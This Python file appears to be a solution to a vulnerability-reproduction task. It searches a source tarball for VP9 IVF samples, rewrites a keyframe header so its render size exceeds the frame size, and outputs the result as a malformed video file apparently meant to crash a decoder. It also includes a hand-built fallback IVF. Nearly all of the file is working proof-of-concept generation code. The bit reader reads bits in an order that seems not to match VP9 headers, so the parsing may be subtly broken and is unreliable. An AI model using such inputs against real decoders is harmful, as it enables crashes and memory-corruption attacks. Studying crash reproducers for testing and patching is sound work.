import io
import os
import re
import tarfile
from typing import List, Optional, Tuple


class BitReader:
    __slots__ = ("data", "bitpos", "n_bits")

    def __init__(self, data: bytes):
        self.data = data
        self.bitpos = 0
        self.n_bits = len(data) * 8

    def bits_left(self) -> int:
        return self.n_bits - self.bitpos

    def read_bits(self, n: int) -> int:
        if n <= 0:
            return 0
        if self.bitpos + n > self.n_bits:
            raise ValueError("BitReader: out of data")
        out = 0
        pos = self.bitpos
        for i in range(n):
            byte = self.data[(pos + i) >> 3]
            bit = (byte >> ((pos + i) & 7)) & 1
            out |= bit << i
        self.bitpos += n
        return out

    def skip_bits(self, n: int) -> None:
        if self.bitpos + n > self.n_bits:
            raise ValueError("BitReader: out of data")
        self.bitpos += n


class BitWriter:
    __slots__ = ("buf", "bitpos")

    def __init__(self):
        self.buf = bytearray()
        self.bitpos = 0

    def write_bits(self, value: int, n: int) -> None:
        if n <= 0:
            return
        needed_bits = self.bitpos + n
        needed_bytes = (needed_bits + 7) >> 3
        if needed_bytes > len(self.buf):
            self.buf.extend(b"\x00" * (needed_bytes - len(self.buf)))
        pos = self.bitpos
        for i in range(n):
            bit = (value >> i) & 1
            idx = (pos + i) >> 3
            off = (pos + i) & 7
            if bit:
                self.buf[idx] |= (1 << off)
            else:
                self.buf[idx] &= ~(1 << off) & 0xFF
        self.bitpos += n

    def get_bytes(self) -> bytes:
        if (self.bitpos & 7) != 0:
            return bytes(self.buf[: (self.bitpos + 7) >> 3])
        return bytes(self.buf)


def _is_ivf(data: bytes) -> bool:
    return len(data) >= 32 and data[0:4] == b"DKIF" and int.from_bytes(data[4:6], "little") in (0, 1) and int.from_bytes(data[6:8], "little") == 32


def _ivf_fourcc(data: bytes) -> bytes:
    if len(data) < 16:
        return b""
    return data[8:12]


def _parse_ivf_frames(data: bytes) -> Tuple[bytes, List[Tuple[int, bytes]]]:
    if not _is_ivf(data):
        raise ValueError("Not IVF")
    header = data[:32]
    pos = 32
    frames: List[Tuple[int, bytes]] = []
    n = len(data)
    while pos + 12 <= n:
        sz = int.from_bytes(data[pos : pos + 4], "little")
        ts = int.from_bytes(data[pos + 4 : pos + 12], "little")
        pos += 12
        if sz < 0 or pos + sz > n:
            break
        frame = data[pos : pos + sz]
        pos += sz
        frames.append((ts, frame))
    return header, frames


def _detect_vp9_superframe(frame: bytes) -> Optional[Tuple[int, int, List[int], int]]:
    if len(frame) < 2:
        return None
    marker = frame[-1]
    if (marker & 0xE0) != 0xC0:
        return None
    mag = (marker & 0x03) + 1
    nframes = ((marker >> 3) & 0x07) + 1
    index_size = 2 + mag * nframes
    if len(frame) < index_size:
        return None
    if frame[-index_size] != marker:
        return None
    sizes = []
    p = len(frame) - index_size + 1
    total = 0
    for _ in range(nframes):
        if p + mag > len(frame) - 1:
            return None
        sz = int.from_bytes(frame[p : p + mag], "little")
        sizes.append(sz)
        total += sz
        p += mag
    if total != len(frame) - index_size:
        return None
    return mag, nframes, sizes, index_size


def _split_superframes(frame: bytes) -> List[bytes]:
    info = _detect_vp9_superframe(frame)
    if not info:
        return [frame]
    _, nframes, sizes, index_size = info
    payload_len = len(frame) - index_size
    payload = frame[:payload_len]
    out = []
    off = 0
    for i in range(nframes):
        sz = sizes[i]
        if off + sz > len(payload):
            break
        out.append(payload[off : off + sz])
        off += sz
    if out and sum(len(x) for x in out) == payload_len:
        return out
    return [frame]


def _modify_vp9_keyframe_render_size(frame: bytes, new_render_w: int, new_render_h: int) -> Optional[Tuple[bytes, int, int]]:
    if not frame:
        return None
    r = BitReader(frame)
    w = BitWriter()

    def cpy(n: int) -> int:
        v = r.read_bits(n)
        w.write_bits(v, n)
        return v

    try:
        frame_marker = cpy(2)
        if frame_marker != 2:
            return None

        profile_low = cpy(1)
        profile_high = cpy(1)
        profile = profile_low | (profile_high << 1)
        if profile == 3:
            cpy(1)  # reserved_zero

        show_existing_frame = cpy(1)
        if show_existing_frame:
            return None

        frame_type = cpy(1)
        cpy(1)  # show_frame
        cpy(1)  # error_resilient_mode
        if frame_type != 0:
            return None

        sync_code = cpy(24)
        if sync_code != 0x498342:
            return None

        color_space = cpy(3)
        if color_space != 7:
            cpy(1)  # color_range
            if profile in (1, 3):
                cpy(1)  # subsampling_x
                cpy(1)  # subsampling_y
                cpy(1)  # reserved
        else:
            if profile in (1, 3):
                cpy(1)  # reserved

        frame_w_m1 = cpy(16)
        frame_h_m1 = cpy(16)
        frame_w = int(frame_w_m1) + 1
        frame_h = int(frame_h_m1) + 1

        render_diff = r.read_bits(1)
        w.write_bits(1, 1)

        if render_diff:
            r.skip_bits(16 + 16)

        rw = max(frame_w + 1, int(new_render_w))
        rh = max(frame_h + 1, int(new_render_h))
        rw = min(65535, rw)
        rh = min(65535, rh)

        w.write_bits((rw - 1) & 0xFFFF, 16)
        w.write_bits((rh - 1) & 0xFFFF, 16)

        left = r.bits_left()
        while left > 0:
            chunk = 32 if left >= 32 else left
            v = r.read_bits(chunk)
            w.write_bits(v, chunk)
            left -= chunk

        out = w.get_bytes()
        return out, frame_w, frame_h
    except Exception:
        return None


def _build_ivf_header(base_header: bytes, fourcc: bytes, width: int, height: int, num_frames: int = 1) -> bytes:
    if len(base_header) < 32:
        base_header = b"DKIF" + (0).to_bytes(2, "little") + (32).to_bytes(2, "little") + fourcc.ljust(4, b"\x00")[:4] + (0).to_bytes(2, "little") + (0).to_bytes(2, "little") + (1).to_bytes(4, "little") + (30).to_bytes(4, "little") + (num_frames).to_bytes(4, "little") + (0).to_bytes(4, "little")
        base_header = base_header[:32]
    h = bytearray(base_header[:32])
    h[0:4] = b"DKIF"
    h[6:8] = (32).to_bytes(2, "little")
    h[8:12] = fourcc.ljust(4, b"\x00")[:4]
    h[12:14] = int(width & 0xFFFF).to_bytes(2, "little")
    h[14:16] = int(height & 0xFFFF).to_bytes(2, "little")
    h[24:28] = int(num_frames & 0xFFFFFFFF).to_bytes(4, "little")
    return bytes(h)


class Solution:
    def solve(self, src_path: str) -> bytes:
        ivf_members = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if name.endswith(".ivf") or name.endswith(".ivf.bin") or name.endswith(".ivf.dat"):
                        ivf_members.append(m)
                ivf_members.sort(key=lambda x: (0 if "svc" in x.name.lower() else 1, x.size, x.name))
                best = None  # (out_bytes, out_len)
                for m in ivf_members[:50]:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    if not _is_ivf(data):
                        continue
                    fourcc = _ivf_fourcc(data)
                    if fourcc not in (b"VP90", b"VP80"):
                        continue
                    try:
                        header, frames = _parse_ivf_frames(data)
                    except Exception:
                        continue
                    candidates = []
                    for _, fr in frames:
                        for sub in _split_superframes(fr):
                            candidates.append(sub)
                    candidates.sort(key=len)
                    for cand in candidates:
                        mod = _modify_vp9_keyframe_render_size(cand, 0, 0)
                        if mod is None:
                            continue
                        _, fw, fh = mod
                        new_rw = min(8192, fw + 1024)
                        new_rh = min(8192, fh + 1024)
                        mod2 = _modify_vp9_keyframe_render_size(cand, new_rw, new_rh)
                        if mod2 is None:
                            continue
                        new_frame, fw2, fh2 = mod2
                        out_header = _build_ivf_header(header, fourcc, fw2, fh2, 1)
                        out = bytearray()
                        out += out_header
                        out += len(new_frame).to_bytes(4, "little")
                        out += (0).to_bytes(8, "little")
                        out += new_frame
                        out_bytes = bytes(out)
                        if best is None or len(out_bytes) < best[1]:
                            best = (out_bytes, len(out_bytes))
                        break
                    if best is not None and best[1] <= 7000:
                        break
                if best is not None:
                    return best[0]
        except Exception:
            pass

        fallback = bytearray()
        fallback += b"DKIF" + (0).to_bytes(2, "little") + (32).to_bytes(2, "little") + b"VP90"
        fallback += (16).to_bytes(2, "little") + (16).to_bytes(2, "little")
        fallback += (1).to_bytes(4, "little") + (30).to_bytes(4, "little")
        fallback += (1).to_bytes(4, "little") + (0).to_bytes(4, "little")
        frame = b"\x82I\x83B\x00\x10\x00\x10" + b"\x00" * 32
        fallback += len(frame).to_bytes(4, "little") + (0).to_bytes(8, "little") + frame
        return bytes(fallback)